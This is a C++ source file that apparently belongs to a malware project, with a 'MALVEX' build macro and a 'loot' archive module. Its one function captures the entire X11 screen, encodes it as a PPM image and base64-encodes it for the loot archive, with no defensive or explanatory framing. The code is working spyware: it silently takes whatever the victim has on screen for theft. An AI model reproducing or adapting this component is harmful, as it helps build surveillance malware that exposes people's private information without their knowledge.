#include "ScreenshotCapture.hpp"
#include "LootArchive.hpp"

#include <cstdlib>
#include <string>
#include <vector>

#if defined(MALVEX_HAS_X11)
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#endif

namespace screenshot_capture {

#if defined(MALVEX_HAS_X11)
[[nodiscard]] std::optional<std::string> capture_base64_ppm() {
    if (!std::getenv("DISPLAY")) {
        return std::nullopt;
    }

    Display* display = XOpenDisplay(nullptr);
    if (!display) {
        return std::nullopt;
    }

    const int screen = DefaultScreen(display);
    const Window root = RootWindow(display, screen);
    XWindowAttributes attrs{};
    if (!XGetWindowAttributes(display, root, &attrs)) {
        XCloseDisplay(display);
        return std::nullopt;
    }

    XImage* image = XGetImage(display, root, 0, 0, attrs.width, attrs.height, AllPlanes, ZPixmap);
    if (!image) {
        XCloseDisplay(display);
        return std::nullopt;
    }

    std::vector<unsigned char> ppm;
    const std::string header = "P6\n" + std::to_string(attrs.width) + " " + std::to_string(attrs.height) + "\n255\n";
    ppm.insert(ppm.end(), header.begin(), header.end());

    for (int y = 0; y < attrs.height; ++y) {
        for (int x = 0; x < attrs.width; ++x) {
            const unsigned long pixel = XGetPixel(image, x, y);
            ppm.push_back(static_cast<unsigned char>((pixel >> 16) & 0xFF));
            ppm.push_back(static_cast<unsigned char>((pixel >> 8) & 0xFF));
            ppm.push_back(static_cast<unsigned char>(pixel & 0xFF));
        }
    }

    XDestroyImage(image);
    XCloseDisplay(display);

    return loot_archive::encode_base64(ppm);
}
#else
[[nodiscard]] std::optional<std::string> capture_base64_ppm() {
    return std::nullopt;
}
#endif

} // namespace screenshot_capture
